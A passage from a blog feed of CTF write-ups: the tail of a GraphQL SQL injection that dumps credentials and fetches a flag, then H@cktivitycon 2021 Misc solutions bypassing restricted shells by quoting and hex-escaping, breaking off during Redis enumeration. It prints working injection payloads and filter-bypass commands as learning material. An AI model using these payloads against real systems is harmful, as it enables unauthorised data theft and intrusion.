</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;posts&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;users&#34;</span><span class="p">}]}}</span>
</span></span></code></pre></div><p>Based on the voyager views, I assumed that the table has the username and the password columns, so I sent a query to dump these columns, and it was correct.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">##</span> <span class="err">req</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; UNION SELECT 1,(SELECT username||password FROM users),3,4,5,6 -- \&#34;){ name }}&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">resp</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;posts&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;congon4torn8bboB!3%vDwiASVgKhv&#34;</span><span class="p">}]}}</span>
</span></span></code></pre></div><p>With these credentials, I can request for a valid token</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">##</span> <span class="err">req</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;mutation {authenticateUser(username: \&#34;congon4tor\&#34;, password: \&#34;n8bboB!3%vDwiASVgKhv\&#34;) {token}}&#34;</span><span class="p">}</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">resp</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;authenticateUser&#34;</span><span class="p">:{</span><span class="nt">&#34;token&#34;</span><span class="p">:</span><span class="s2">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNvbmdvbjR0b3IiLCJleHAiOjE2MzIzNDIzNjUsImlhdCI6MTYzMjE2OTU2NSwiaXNzIjoiQ29uZ29uNHRvciJ9.2huNUpNe3_vIkAwIcYxKeLbJfnmyugX3GydGD9prJiY&#34;</span><span class="p">}}}</span>
</span></span></code></pre></div><p>Now I can query the flag with the following request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/graphql</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">challenge.ctf.games:30013</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://challenge.ctf.games:30013/post/Strawberry%20Cake</span>
</span></span><span class="line"><span class="cl"><span class="n">content-type</span><span class="o">:</span> <span class="l">application/json</span>
</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://challenge.ctf.games:30013</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">23</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNob3JvcHlzIiwiZXhwIjoxNjMyMDYzNDEyLCJpYXQiOjE2MzE4OTA2MTIsImlzcyI6IkNvbmdvbjR0b3IifQ.mXLkQDZ5Oum3Bq8A4ZFHyNX9QmS0qhcBR8ph0-WfxmI</span>
</span></span><span class="line"><span class="cl"><span class="n">Authorization</span><span class="o">:</span> <span class="l">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNvbmdvbjR0b3IiLCJleHAiOjE2MzIzNDIzNjUsImlhdCI6MTYzMjE2OTU2NSwiaXNzIjoiQ29uZ29uNHRvciJ9.2huNUpNe3_vIkAwIcYxKeLbJfnmyugX3GydGD9prJiY</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;{flag}&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The response:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json; charset=utf-8</span>
</span></span><span class="line"><span class="cl"><span class="n">Date</span><span class="o">:</span> <span class="l">Fri, 17 Sep 2021 20:17:24 GMT</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">53</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;flag&#34;</span><span class="p">:</span><span class="s2">&#34;flag{9d26b6e4a765ecd87fe03a1494c22236}&#34;</span><span class="p">}}</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>H@cktivitycon 2021 - Misc</title>
      <link>https://fahmifj.github.io/hacktivitycon/hacktivitycon-2021-misc/</link>
      <pubDate>Mon, 04 Oct 2021 02:50:12 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hacktivitycon/hacktivitycon-2021-misc/</guid>
      <description>This is my late CTF writeups for H@cktivitycon 2021 miscellaneous category.</description>
      <content:encoded><![CDATA[<p>So, in mid September 2021, I participated in the H@cktivitycon 2021 CTF. The event was hosted by HackerOne and lasted for two days.</p>
<p>A bit late but in this post, I&rsquo;ll share my writeups/solutions for three Miscellaneous category challenges that I solved.</p>
<p>I signed up earlier but only played the main challenges in the last few hours, which I now regret because there were so many fantastic challenges 😅🔨</p>
<h2 id="badwords">Badwords</h2>
<fieldset>
<legend>Challenge Information</legend>
<ul>
<li>
<p><strong>Author:</strong> -</p>
</li>
<li>
<p><strong>Category:</strong> Misc</p>
</li>
<li>
<p><strong>Difficulty:</strong> Easy</p>
</li>
<li>
<p><strong>Description</strong>:</p>
<p>You look questionable&hellip; if you don&rsquo;t have anything good to say, don&rsquo;t say anything at all!</p>
</li>
</ul>
</fieldset>
<h3 id="walkthrough">Walkthrough</h3>
<p>When connecting, I can assume that it’s not in a proper TTY, maybe a kind of wrapper shell. Each command I sent returned with the same message telling me that it was a bad word.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">iamf@ubuntu:~$ rlwrap nc -v challenge.ctf.games <span class="m">32559</span>
</span></span><span class="line"><span class="cl">Connection to challenge.ctf.games <span class="m">32559</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>-1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">user@host:/home/user$ ls -l
</span></span><span class="line"><span class="cl">ls -l
</span></span><span class="line"><span class="cl">You said a bad word, <span class="s2">&#34;l&#34;</span>!!
</span></span><span class="line"><span class="cl">user@host:/home/user$ <span class="nb">echo</span> <span class="nv">$0</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$0</span>
</span></span><span class="line"><span class="cl">You said a bad word, <span class="s2">&#34;echo&#34;</span>!!
</span></span></code></pre></div><p>But if I send a command separator, it returns a syntax error (notice the <code>;'</code>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@host:/home/user$ <span class="p">;</span>ls
</span></span><span class="line"><span class="cl"><span class="p">;</span>ls
</span></span><span class="line"><span class="cl">bash: syntax error near unexpected token <span class="sb">`</span><span class="p">;</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">user@host:/home/user$
</span></span></code></pre></div><p>If I send a command enclosed with a single quote, I get the expected results. And if I supply an argument, it returns a different error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@host:/home/user$ <span class="s1">&#39;whoami&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;whoami&#39;</span>
</span></span><span class="line"><span class="cl">user
</span></span><span class="line"><span class="cl">user@host:/home/user$ <span class="s1">&#39;ls -l&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;ls -l&#39;</span>
</span></span><span class="line"><span class="cl">bash: ls -l: <span class="nb">command</span> not found
</span></span></code></pre></div><p>So I try to separate the argument, and it works.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@host:/home/user$ <span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span>
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 just
</span></span></code></pre></div><p>Now I can just do a recursive <code>ls</code> to find the flag and read it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@host:/home/user$ <span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span> <span class="s1">&#39;-R&#39;</span> <span class="s1">&#39;just&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span> <span class="s1">&#39;-R&#39;</span> <span class="s1">&#39;just&#39;</span>
</span></span><span class="line"><span class="cl">just:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 out
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">just/out:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 of
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">just/out/of:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 reach
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">just/out/of/reach:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> user user <span class="m">38</span> Sep  <span class="m">9</span> 19:47 flag.txt
</span></span><span class="line"><span class="cl">user@host:/home/user$ <span class="s1">&#39;cat&#39;</span> <span class="s1">&#39;just/out/of/reach/flag.txt&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;cat&#39;</span> <span class="s1">&#39;just/out/of/reach/flag.txt&#39;</span>
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>2d43e30a358d3f30fe65cc47a9cbbe98<span class="o">}</span>user@host:/home/user$
</span></span></code></pre></div><h2 id="shelle">Shelle</h2>
<fieldset>
<legend>Challenge Information </legend>
<ul>
<li>
<p><strong>Author:</strong> -</p>
</li>
<li>
<p><strong>Category:</strong> Misc</p>
</li>
<li>
<p><strong>Difficulty:</strong>  Easy</p>
</li>
<li>
<p><strong>Description:</strong>
Professor Shelle created a custom psuedo shell for us to learn Linux,  she believes it&rsquo;s safe and no one can ever read the flag. Can you prove  her wrong?*</p>
</li>
</ul>
</fieldset>
<h3 id="walkthrough-1">Walkthrough</h3>
<p>This challenge is another shell wrapper like badwords. Upon connected, I was provided with the following menu.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">iamf@ubuntu:~$ rlwrap nc challenge.ctf.games <span class="m">32217</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome to Shelle, a custom psuedo shell utility created by Professor Shelle in order to teach students about Linux terminals
</span></span><span class="line"><span class="cl">Shelle is a restricted environment to prevent any misuse, Please Enter <span class="s1">&#39;HELP&#39;</span> to know about available features, happy learning !
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root@pshelle$ HELP
</span></span><span class="line"><span class="cl">HELP
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Here is the list of <span class="nb">command</span> availiable to Students
</span></span><span class="line"><span class="cl">1&gt; whoami
</span></span><span class="line"><span class="cl">2&gt; <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">3&gt; ls
</span></span><span class="line"><span class="cl">4&gt; ps
</span></span><span class="line"><span class="cl">5&gt; id
</span></span><span class="line"><span class="cl">6&gt; <span class="nb">echo</span>
</span></span><span class="line"><span class="cl">7&gt; cat
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root@shelle$ 
</span></span></code></pre></div><p>When I use the <code>ls</code> command, I didn&rsquo;t find any flag in the current working directory. It seems I have to find it somewhere in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@shelle$ ls
</span></span><span class="line"><span class="cl">ls
</span></span><span class="line"><span class="cl">assignment.txt  bin
</span></span></code></pre></div><p>The first thing I tried was to list the root directory with <code>ls -l /</code>, but it turned out that some characters, including <code>/</code>, are flagged as illegal. Luckily, these chars are not,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">$ ( ) &#34; \
</span></span></code></pre></div><p>So, I can use the <code>echo</code> command with <code>-e</code> option within a subshell to print <code>\x2f</code> which is a hex form of <code>/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@shelle$ ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2f&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2f&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var
</span></span><span class="line"><span class="cl">boot  etc  lib   lib64  media   opt  root  sbin  sys  usr
</span></span></code></pre></div><p>After wandering around, I found the flag on <code>/opt/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@shelle$ ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt&#34;</span><span class="k">)</span> -lt
</span></span><span class="line"><span class="cl">ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt&#34;</span><span class="k">)</span> -lt
</span></span><span class="line"><span class="cl">total <span class="m">24</span>
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> shelle shelle <span class="m">17312</span> Sep  <span class="m">9</span> 19:33 binary
</span></span><span class="line"><span class="cl">-r--r--r-- <span class="m">1</span> root   root      <span class="m">38</span> Sep  <span class="m">9</span> 19:33 flag.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root@shelle$ cat <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt\x2fflag.txt&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">cat <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt\x2fflag.txt&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>82ad133488ad326eaf2120e03253e5d7<span class="o">}</span>
</span></span></code></pre></div><blockquote>
<p><strong>Note</strong>: I added a space after the shell prompt for readability and syntax highlighting.</p>
</blockquote>
<h2 id="redlike">Redlike</h2>
<fieldset>
<legend>Challenge Information </legend>
<ul>
<li>
<p><strong>Author:</strong> -</p>
</li>
<li>
<p><strong>Category:</strong> Misc</p>
</li>
<li>
<p><strong>Difficulty:</strong>  Medium</p>
</li>
<li>
<p><strong>Description:</strong></p>
<p>You know, I like the color red. Primary colors are the best colors &ndash; you can do so much with them!</p>
<p><em>Escalate your privileges and retrieve the flag out of <code>root</code>&rsquo;s home directory.</em></p>
</li>
</ul>
</fieldset>
<h3 id="walkthrough-2">Walkthrough</h3>
<p>For this challenge, there was a set of credentials given for SSH login into a VM instance.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">iamf@ubuntu:~$ ssh -p <span class="m">31464</span> user@challenge.ctf.games
</span></span><span class="line"><span class="cl">user@challenge.ctf.games<span class="s1">&#39;s password:
</span></span></span><span class="line"><span class="cl"><span class="s1">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1"> * Documentation:  https://help.ubuntu.com
</span></span></span><span class="line"><span class="cl"><span class="s1"> * Management:     https://landscape.canonical.com
</span></span></span><span class="line"><span class="cl"><span class="s1"> * Support:        https://ubuntu.com/advantage
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">This system has been minimized by removing packages and content that are
</span></span></span><span class="line"><span class="cl"><span class="s1">not required on a system that users do not log into.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The programs included with the Ubuntu system are free software<span class="p">;</span>
</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span><span class="line"><span class="cl">applicable law.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">user@redlike-a6548218fe17631b-b75878d5-qsl75:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
</span></span></code></pre></div><p>At the root directory, I found <code>.docker-entrypoint</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ ls -lah
</span></span><span class="line"><span class="cl">total 72K
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 .
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x    <span class="m">1</span> root root   <span class="m">61</span> Sep <span class="m">16</span> 14:43 .docker-entrypoint
</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">7</span> Aug <span class="m">27</span> 07:16 bin -&gt; usr/bin
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> root root 4.0K Apr <span class="m">15</span>  <span class="m">2020</span> boot
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">5</span> root root  <span class="m">360</span> Sep <span class="m">18</span> 11:34 dev
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 etc
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:43 home
</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">7</span> Aug <span class="m">27</span> 07:16 lib -&gt; usr/lib
</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">9</span> Aug <span class="m">27</span> 07:16 lib32 -&gt; usr/lib32
</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">9</span> Aug <span class="m">27</span> 07:16 lib64 -&gt; usr/lib64
</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> root root   <span class="m">10</span> Aug <span class="m">27</span> 07:16 libx32 -&gt; usr/libx32
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 media
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 mnt
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 opt
</span></span><span class="line"><span class="cl">dr-xr-xr-x <span class="m">2595</span> root root    <span class="m">0</span> Sep <span class="m">18</span> 11:34 proc
</span></span><span class="line"><span class="cl">drwx------    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 root
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 run
</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">8</span> Aug <span class="m">27</span> 07:16 sbin -&gt; usr/sbin
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 srv
</span></span><span class="line"><span class="cl">dr-xr-xr-x   <span class="m">12</span> root root    <span class="m">0</span> Sep <span class="m">18</span> 11:33 sys
</span></span><span class="line"><span class="cl">drwxrwxrwt    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 tmp
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Aug <span class="m">27</span> 07:16 usr
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root root 4.0K Aug <span class="m">27</span> 07:27 var
</span></span></code></pre></div><p>Based on the contents of the file and the name of the challenge, it&rsquo;s clear that the privesc has something to do with Redis.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ cat .docker-entrypoint
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/etc/init.d/redis-server start
</span></span><span class="line"><span class="cl">/usr/sbin/sshd -D
</span></span></code></pre></div><p>I can connect to the Redis server using <code>redis-cli</code> without authentication. I started the enumeration by sending <code>INFO</code> command, but under <code># Keyspace</code>, I found no active database.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ which redis-cli
</span></span><span class="line"><span class="cl">/usr/bin/redis-cli
</span></span><span class="line"><span class="cl">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ redis-cli
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; INFO
</span></span><span class="line"><span class="cl"><span class="c1"># Server</span>
</span></span><span class="line"><span class="cl">redis_version:5.0.7
</span></span><span class="line"><span class="cl">redis_git_sha1:00000000
</span></span><span class="line"><span class="cl">redis_git_dirty:0
</span></span><span class="line"><span class="cl">redis_build_id:636cde3b5c7a3923
</span></span><span class="line"><span class="cl">redis_mode:standalone
</span></span><span class="line"><span class="cl">os:Linux 5.4.120+ x86_64
</span></span><span class="line"><span class="cl">arch_bits:64
</span></span><span class="line"><span class="cl">multiplexing_api:epoll
</span></span><span class="line"><span class="cl">atomicvar_api:atomic-builtin
</span></span><span class="line"><span class="cl">gcc_version:9.2.1
</span></span><span class="line"><span class="cl">process_id:15
</span></span><span class="line"><span class="cl">run_id:f5d6504f95159db85bb78e1bd786b2f3171564fd
</span></span><span class="line"><span class="cl">tcp_port:6379
</span></span><span class="line"><span class="cl">uptime_in_seconds:344
</span></span><span class="line"><span class="cl">uptime_in_days:0
</span></span><span class="line"><span class="cl">hz:10
</span></span><span class="line"><span class="cl">configured_hz:10
</span></span><span class="line"><span class="cl">lru_clock:4575234
</span></span><span class="line"><span class="cl">executable:/usr/bin/redis-server
</span></span><span class="line"><span class="cl">config_file:/etc/redis/redis.conf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Clients</span>
</span></span><span class="line"><span class="cl">connected_clients:1
</span></span><span class="line"><span class="cl">client_recent_max_input_buffer:2
</span></span><span class="line"><span class="cl">client_recent_max_output_buffer:0
</span></span><span class="line"><span class="cl">blocked_clients:0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Memory</span>
</span></span><span class="line"><span class="cl">used_memory:859152
</span></span><span class="line"><span class="cl">used_memory_human:839.02K
</span></span><span class="line"><span class="cl">used_memory_rss:6017024
</span></span><span class="line"><span class="cl">used_memory_rss_human:5.74M
</span></span><span class="line"><span class="cl">used_memory_peak:859152
</span></span><span class="line"><span class="cl">used_memory_peak_human:839.02K
</span></span><span class="line"><span class="cl">used_memory_peak_perc:100.12%
</span></span><span class="line"><span class="cl">used_memory_overhead:845926
</span></span><span class="line"><span class="cl">used_memory_startup:796232
</span></span><span class="line"><span class="cl">used_memory_dataset:13226
</span></span><span class="line"><span class="cl">used_memory_dataset_perc:21.02%
</span></span><span class="line"><span class="cl">allocator_allocated:1575864
</span></span><span class="line"><span class="cl">allocator_active:1847296
</span></span><span class="line"><span class="cl">allocator_resident:9879552
</span></span><span class="line"><span class="cl">total_system_memory:33678073856
</span></span><span class="line"><span class="cl">total_system_memory_human:31.37G
</span></span><span class="line"><span class="cl">used_memory_lua:41984
</span></span><span class="line"><span class="cl">used_memory_lua_human:41.00K
</span></span><span class="line"><span class="cl">used_memory_scripts:0
</span></span><span class="line"><span class="cl">used_memory_scripts_human:0B
</span></span><span class="line"><span class="cl">number_of_cached_scripts:0
</span></span><span class="line"><span class="cl">maxmemory:0
</span></span><span class="line"><span class="cl">maxmemory_human:0B
</span></span><span class="line"><span class="cl">maxmemory_policy:noeviction
</span></span><span class="line"><span class="cl">allocator_frag_ratio:1.17
</span></span><span class="line"><span class="cl">allocator_frag_bytes:271432
</span></span><span class="line"><span class="cl">allocator_rss_ratio:5.35
</span></span><span class="line"><span class="cl">allocator_rss_bytes:8032256
</span></span><span class="line"><span class="cl">rss_overhead_ratio:0.61
</span></span><span class="line"><span class="cl">rss_overhead_bytes:-3862528
</span></span><span class="line"><span class="cl">mem_fragmentation_ratio:7.36
</span></span><span class="line"><span class="cl">mem_fragmentation_bytes:5199880
</span></span><span class="line"><span class="cl">mem_not_counted_for_evict:0
</span></span><span class="line"><span class="cl">mem_replication_backlog:0
</span></span><span class="line"><span class="cl">mem_clients_slaves:0
</span></span><span class="line"><span class="cl">mem_clients_normal:49694
</span></span><span class="line"><span class="cl">mem_aof_buffer:0
</span></span><span class="line"><span class="cl">mem_allocator:jemalloc-5.2.1
</span></span><span class="line"><span class="cl">active_defrag_running:0
</span></span><span class="line"><span class="cl">lazyfree_pending_objects:0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Persistence</span>
</span></span><span class="line"><span class="cl">loading:0
</span></span><span class="line"><span class="cl">rdb_changes_since_last_save:0
</span></span><span class="line"><span class="cl">rdb_bgsave_in_progress:0
</span></span><span class="line"><span class="cl">rdb_last_save_time:1631964842
</span></span><span class="line"><span class="cl">rdb_last_bgsave_status:ok
</span></span><span class="line"><span class="cl">rdb_last_bgsave_time_sec:-1
</span></span><span class="line"><span class="cl">rdb_current_bgsave_time_sec:-1
</span></span><span class="line"><span class="cl">rdb_last_cow_size:0
</span></span><span class="line"><span class="cl">aof_enabled:0
</span></span><span class="line"><span class="cl">aof_rewrite_in_progress:0
</span></span><span class="line"><span class="cl">aof_rewrite_scheduled:0
